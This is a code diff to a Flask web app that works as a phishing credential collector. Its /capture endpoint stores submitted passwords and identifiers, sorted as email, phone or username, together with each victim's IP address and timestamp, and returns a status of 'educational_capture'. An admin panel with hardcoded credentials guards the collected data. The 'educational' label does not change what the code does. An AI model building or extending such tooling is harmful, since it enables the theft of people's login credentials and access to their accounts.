@@ -2,9 +2,9 @@ from flask import Flask, request, render_template, jsonify, redirect, url_for, s
 from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = 'd29c234ca310aa6990092d4b6cd4c4854585c51e1f73bf4de510adca03f5bc4e'
+app.secret_key = 'your_very_secret_key_here'
 
-# Simulated storage with unique IDs
+# Simulated storage with enhanced fields
 captured_creds = []
 next_id = 1
 ADMIN_CREDENTIALS = {'username': '4!cks', 'password': '0220Mpc'}
@@ -17,14 +17,31 @@ def home():
 def capture():
     global next_id
     data = request.json
+    
+    # Determine identifier type automatically
+    identifier = data.get('identifier', '')
+    identifier_type = 'unknown'
+    
+    if '@' in identifier and '.' in identifier:
+        identifier_type = 'email'
+    elif identifier.isdigit() and len(identifier) >= 10:
+        identifier_type = 'phone'
+    elif identifier:
+        identifier_type = 'username'
+    
     data.update({
         "id": next_id,
+        "identifier": identifier,
+        "identifier_type": identifier_type,
         "ip": request.remote_addr,
-        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "password": data.get('password', '')
     })
+    
     captured_creds.append(data)
     next_id += 1
     return jsonify({"status": "educational_capture"})
+
 
 @app.route("/login", methods=["GET", "POST"])
 def admin_login():
